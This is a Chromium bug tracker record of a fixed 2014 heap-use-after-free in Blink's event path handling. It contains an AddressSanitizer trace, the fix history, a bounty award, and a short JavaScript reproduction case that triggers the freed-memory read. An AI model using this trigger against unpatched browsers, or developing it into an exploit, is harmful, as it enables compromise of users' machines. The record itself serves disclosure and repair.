# Heap-use-after-free in blink::TreeScopeEventContext::ensureEventPath

| Field | Value |
|-------|-------|
| **Issue ID** | [40081027](https://issues.chromium.org/issues/40081027) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | cl...@gmail.com |
| **Assignee** | ha...@chromium.org |
| **Created** | 2014-12-16 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase requires the --js-flags=--expose-gc flag. It crashes the latest asan build of chrome as follows:

=================================================================  

==3008==ERROR: AddressSanitizer: heap-use-after-free on address 0x61e000009ce0 at pc 0x7f16f43c6dc3 bp 0x7fff05c15450 sp 0x7fff05c15448  

READ of size 8 at 0x61e000009ce0 thread T0 (chrome)  

#0 0x7f16f43c6dc2 in rootNode /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/wtf/RawPtr.h:118  

#1 0x7f16f4393ba3 in path /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/events/Event.cpp:251  

#2 0x7f16f60a5e8a in pathAttributeGetter /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8Event.cpp:236  

#3 0x7f16f3c11fa8 in Call /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/arguments.cc:87  

#4 0x7f16f37de3b2 in GetPropertyWithAccessor /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/objects.cc:445  

#5 0x7f16f36d2f7e in Load /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/ic/ic.cc:773  

#6 0x7f16f36ec094 in \_\_RT\_impl\_LoadIC\_Miss /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/ic/ic.cc:2340 (discriminator 1)  

#7 0x7f16b44071ba (<unknown module>)  

#8 0x7f16b446dc1c (<unknown module>)  

#9 0x7f16b443775f (<unknown module>)  

#10 0x7f16b4432210 (<unknown module>)  

#7 0x7f16f32470c4 in Invoke /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/execution.cc:103  

#8 0x7f16f3045d5a in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/api.cc:1609  

#9 0x7f16f5fa2972 in runCompiledScript /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:340  

#10 0x7f16f5f2157a in executeScriptAndReturnValue /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:202 (discriminator 3)  

#11 0x7f16f5f27730 in evaluateScriptInMainWorld /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:618  

#12 0x7f16f5f27f7b in blink::ScriptController::executeScriptInMainWorld(blink::ScriptSourceCode const&, blink::AccessControlStatus, double\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:586  

#13 0x7f16f4405f96 in executeScript /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:371  

#14 0x7f16f44005df in prepareScript /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:267  

#15 0x7f16f4702acd in runScript /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:348  

#16 0x7f16f47023ea in execute /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:210  

#17 0x7f16f46d36dd in runScriptsForPausedTreeBuilder /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:286  

#18 0x7f16f46d6e04 in processParsedChunkFromBackgroundParser /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:461  

#19 0x7f16f46d29ff in pumpPendingSpeculations /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:517  

#20 0x7f16f46d487a in didReceiveParsedChunkFromBackgroundParser /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:338  

#21 0x7f16f48b768a in operator() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/wtf/Functional.h:88 (discriminator 4)  

#22 0x7f16f2f326cf in operator() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/wtf/Functional.h:513  

#23 0x7f16f0c605df in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/callback.h:396  

#24 0x7f16f0b9a84c in RunTask /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:436  

#25 0x7f16f0b9b8c5 in DeferOrRunPendingTask /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:446  

#26 0x7f16f0ba1f7e in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_pump\_default.cc:32  

#27 0x7f16f0bce9a8 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/run\_loop.cc:55  

#28 0x7f16f0b98fc6 in base::MessageLoop::Run() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:298  

#29 0x7f16fa524423 in RendererMain /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/renderer/renderer\_main.cc:235  

#30 0x7f16f0b08b43 in RunZygote /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/app/content\_main\_runner.cc:347  

#31 0x7f16f0b0aec6 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/app/content\_main\_runner.cc:789  

#32 0x7f16f0b08178 in ContentMain /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/app/content\_main.cc:19  

#33 0x7f16efc678d4 in ChromeMain /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../chrome/app/chrome\_main.cc:66  

#34 0x7f16e5b18ec4 in \_\_libc\_start\_main /build/buildd/eglibc-2.19/csu/libc-start.c:287

0x61e000009ce0 is located 96 bytes inside of 2704-byte region [0x61e000009c80,0x61e00000a710)  

freed by thread T0 (chrome) here:  

#0 0x7f16efc492b9 in \_\_interceptor\_free ??:?  

#1 0x7f16f32fa844 in PostGarbageCollectionProcessing /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/global-handles.cc:272  

#2 0x7f16f32f9d54 in PostGarbageCollectionProcessing /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/global-handles.cc:695  

#3 0x7f16f334c188 in PerformGarbageCollection /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/heap/heap.cc:1121  

#4 0x7f16f334aeb4 in CollectGarbage /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/heap/heap.cc:844  

#5 0x7f16f334a75f in CollectGarbage /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/heap/heap-inl.h:583  

#6 0x7f16f30743da in RequestGarbageCollectionForTesting /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/api.cc:6489  

#7 0x7f16f3c1139e in Call /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/arguments.cc:33  

#8 0x7f16f30fa3df in HandleApiCallHelper<false> /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/builtins.cc:1139  

#9 0x7f16b44071ba (<unknown module>)  

#10 0x7f16b446dbef (<unknown module>)  

#11 0x7f16b443775f (<unknown module>)  

#12 0x7f16b4432210 (<unknown module>)  

#9 0x7f16f32470c4 in Invoke /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/execution.cc:103  

#10 0x7f16f3045d5a in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/api.cc:1609  

#11 0x7f16f5fa2972 in runCompiledScript /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:340  

#12 0x7f16f5f2157a in executeScriptAndReturnValue /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:202 (discriminator 3)  

#13 0x7f16f5f27730 in evaluateScriptInMainWorld /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:618  

#14 0x7f16f5f27f7b in blink::ScriptController::executeScriptInMainWorld(blink::ScriptSourceCode const&, blink::AccessControlStatus, double\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:586  

#15 0x7f16f4405f96 in executeScript /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:371  

#16 0x7f16f44005df in prepareScript /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:267  

#17 0x7f16f4702acd in runScript /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:348  

#18 0x7f16f47023ea in execute /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:210  

#19 0x7f16f46d36dd in runScriptsForPausedTreeBuilder /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:286  

#20 0x7f16f46d6e04 in processParsedChunkFromBackgroundParser /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:461  

#21 0x7f16f46d29ff in pumpPendingSpeculations /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:517  

#22 0x7f16f46d487a in didReceiveParsedChunkFromBackgroundParser /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:338  

#23 0x7f16f48b768a in operator() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/wtf/Functional.h:88 (discriminator 4)  

#24 0x7f16f2f326cf in operator() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/wtf/Functional.h:513  

#25 0x7f16f0c605df in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/callback.h:396

previously allocated by thread T0 (chrome) here:  

#0 0x7f16efc49579 in \_\_interceptor\_malloc ??:?  

#1 0x7f16f428419a in partitionAlloc /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/wtf/PartitionAlloc.h:477  

#2 0x7f16f43e26ff in create /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/XMLDocument.h:39  

#3 0x7f16f67bdcf9 in createDocumentMethod /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8DOMImplementation.cpp:120  

#4 0x7f16f3c1139e in Call /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/arguments.cc:33  

#5 0x7f16f30fa3df in HandleApiCallHelper<false> /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/builtins.cc:1139  

#6 0x7f16b44071ba (<unknown module>)  

#7 0x7f16b446d8ba (<unknown module>)  

#8 0x7f16b443775f (<unknown module>)  

#9 0x7f16b4432210 (<unknown module>)  

#6 0x7f16f32470c4 in Invoke /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/execution.cc:103  

#7 0x7f16f3045d5a in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/api.cc:1609  

#8 0x7f16f5fa2972 in runCompiledScript /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:340  

#9 0x7f16f5f2157a in executeScriptAndReturnValue /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:202 (discriminator 3)  

#10 0x7f16f5f27730 in evaluateScriptInMainWorld /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:618  

#11 0x7f16f5f27f7b in blink::ScriptController::executeScriptInMainWorld(blink::ScriptSourceCode const&, blink::AccessControlStatus, double\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:586  

#12 0x7f16f4405f96 in executeScript /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:371  

#13 0x7f16f44005df in prepareScript /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:267  

#14 0x7f16f4702acd in runScript /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:348  

#15 0x7f16f47023ea in execute /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:210  

#16 0x7f16f46d36dd in runScriptsForPausedTreeBuilder /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:286  

#17 0x7f16f46d6e04 in processParsedChunkFromBackgroundParser /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:461  

#18 0x7f16f46d29ff in pumpPendingSpeculations /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:517  

#19 0x7f16f46d487a in didReceiveParsedChunkFromBackgroundParser /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:338  

#20 0x7f16f48b768a in operator() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/wtf/Functional.h:88 (discriminator 4)  

#21 0x7f16f2f326cf in operator() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/wtf/Functional.h:513  

#22 0x7f16f0c605df in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/callback.h:396  

#23 0x7f16f0b9a84c in RunTask /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:436  

#24 0x7f16f0b9b8c5 in DeferOrRunPendingTask /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:446  

#25 0x7f16f0ba1f7e in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_pump\_default.cc:32

SUMMARY: AddressSanitizer: heap-use-after-free ??:0 ??  

Shadow bytes around the buggy address:  

0x0c3c7fff9340: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c3c7fff9350: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c3c7fff9360: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c3c7fff9370: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c3c7fff9380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

=>0x0c3c7fff9390: fd fd fd fd fd fd fd fd fd fd fd fd[fd]fd fd fd  

0x0c3c7fff93a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c3c7fff93b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c3c7fff93c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c3c7fff93d0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c3c7fff93e0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Heap right redzone: fb  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack partial redzone: f4  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

==3008==ABORTING

**VERSION**  

Chrome Version: asan-linux-release-308523

**REPRODUCTION CASE**

<script>
o76=document.implementation.createDocumentType('doc','-//W3C//DTD XHTML 1.0 Transitional//EN','http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd');
o77=document.implementation.createDocument('http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul','doc',o76);
o97=o76.ownerDocument.createElement('iframe');
delete o76;
delete o77;
o106=document.createEvent('MouseEvents');
o106.initMouseEvent('click', true, true, window,0, 0, 0, 0, 0, false, false, false, false, 0, null);
o97.dispatchEvent(o106);
o140=document.documentElement;
o140.appendChild(o97);
gc();
o106.path;
</script>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

## Timeline

### cl...@chromium.org (2014-12-16)

ClusterFuzz is analyzing your testcase. Chromium developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5749029504811008

### in...@chromium.org (2014-12-16)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-12-16)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-12-16)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5749029504811008

Uploader: inferno@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x61e0000090e0
Crash State:
  blink::TreeScopeEventContext::ensureEventPath
  blink::Event::path
  blink::EventV8Internal::pathAttributeGetterCallback
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=289799:289908

Minimized Testcase (0.58 Kb): https://cluster-fuzz.appspot.com/download/AMIfv94A2mE_KOO5zSsxRxuz9fe2Pkfps_rFVeCMT7gthKHk9L0UH5jXW6TSrupUaTWSlG1jLcfwfcY31amta3TQSHa5ptd9Ka0NrdMpmopgdXUvax5PDokir2Q_iqN40mbxbOp0G7Hw6nycuDp0nZc3-PnYQ7KKcg



### in...@chromium.org (2014-12-16)

Author: hayato@chromium.org 
Component: blink
Changelist: https://chromium.googlesource.com/chromium/blink.git/+/54c10ec2b125a1b2494d60080cb923f3e623f44e
Time: Thu Aug 14 17:24:35 2014
File Event.cpp is changed in this cl (and is part of stack frame #2, "blink::Event::path")
Minimum distance from crash line to modified line: 11. (file: Event.cpp, crashed on: 248, modified: 237).

### cl...@chromium.org (2014-12-17)

[Empty comment from Monorail migration]

### ha...@chromium.org (2014-12-17)

Confirmed. I could reproduce this.

The root cause is that TreeScopeEventContext::m_treeScope is not a RefPtr.
We should make TreeScope *RefCounted* somehow. I'm not sure this is a good idea.
Maybe we can have another idea.

### bu...@chromium.org (2014-12-18)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=187435

------------------------------------------------------------------
r187435 | hayato@chromium.org | 2014-12-18T07:06:48.798440Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/events/TreeScopeEventContext.cpp?r1=187435&r2=187434&pathrev=187435
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/events/TreeScopeEventContext.h?r1=187435&r2=187434&pathrev=187435
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/dom/shadow/event-path-after-deleting-tree-scope-crash-expected.txt?r1=187435&r2=187434&pathrev=187435
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/dom/shadow/event-path-after-deleting-tree-scope-crash.html?r1=187435&r2=187434&pathrev=187435

Make TreeScopeEventContext have a RefPtr to TreeScope.rootNode to guard TreeScope.

This fixes a use-after-free caused by TreeScope being freed while TreeScopeEventContext still needs it.
Because TreeScope itself isn't a RefCounted, guard it by having a RefPtr to treeScope.rootNode(), instead.

BUG=442806

Review URL: https://codereview.chromium.org/794123004
-----------------------------------------------------------------

### ha...@chromium.org (2014-12-18)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-12-18)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-12-19)

ClusterFuzz has detected this issue as fixed in range 308970:308995.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5749029504811008

Uploader: inferno@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x61e0000090e0
Crash State:
  blink::TreeScopeEventContext::ensureEventPath
  blink::Event::path
  blink::EventV8Internal::pathAttributeGetterCallback
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=289799:289908
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=308970:308995

Minimized Testcase (0.58 Kb): https://cluster-fuzz.appspot.com/download/AMIfv94A2mE_KOO5zSsxRxuz9fe2Pkfps_rFVeCMT7gthKHk9L0UH5jXW6TSrupUaTWSlG1jLcfwfcY31amta3TQSHa5ptd9Ka0NrdMpmopgdXUvax5PDokir2Q_iqN40mbxbOp0G7Hw6nycuDp0nZc3-PnYQ7KKcg

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.


### in...@chromium.org (2014-12-22)

[Empty comment from Monorail migration]

### ma...@google.com (2014-12-22)

Approved for M40 (branch: 2214)

### in...@chromium.org (2015-01-02)

Please merges these fixes to M40 (branch: 2214) asap. The branch will be cut soon for M40 release.

### bu...@chromium.org (2015-01-05)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=187833

------------------------------------------------------------------
r187833 | hayato@chromium.org | 2015-01-05T01:12:42.497326Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/branches/chromium/2214/Source/core/events/TreeScopeEventContext.cpp?r1=187833&r2=187832&pathrev=187833
   M http://src.chromium.org/viewvc/blink/branches/chromium/2214/Source/core/events/TreeScopeEventContext.h?r1=187833&r2=187832&pathrev=187833
   A http://src.chromium.org/viewvc/blink/branches/chromium/2214/LayoutTests/fast/dom/shadow/event-path-after-deleting-tree-scope-crash-expected.txt?r1=187833&r2=187832&pathrev=187833
   A http://src.chromium.org/viewvc/blink/branches/chromium/2214/LayoutTests/fast/dom/shadow/event-path-after-deleting-tree-scope-crash.html?r1=187833&r2=187832&pathrev=187833

Merge 187435 "Make TreeScopeEventContext have a RefPtr to TreeSc..."

> Make TreeScopeEventContext have a RefPtr to TreeScope.rootNode to guard TreeScope.
> 
> This fixes a use-after-free caused by TreeScope being freed while TreeScopeEventContext still needs it.
> Because TreeScope itself isn't a RefCounted, guard it by having a RefPtr to treeScope.rootNode(), instead.
> 
> BUG=442806
> 
> Review URL: https://codereview.chromium.org/794123004

TBR=hayato@chromium.org

Review URL: https://codereview.chromium.org/834093002
-----------------------------------------------------------------

### in...@chromium.org (2015-01-05)

[Empty comment from Monorail migration]

### ti...@google.com (2015-01-22)

Congrats cloudfuzzer - $3000 for this report.

### ti...@google.com (2015-03-09)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-03-27)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2015-04-07)

Processing via our e-payment system can take up to six weeks, but the reward should be on its way to you. Thanks again for your help!

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/442806?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40081027)*
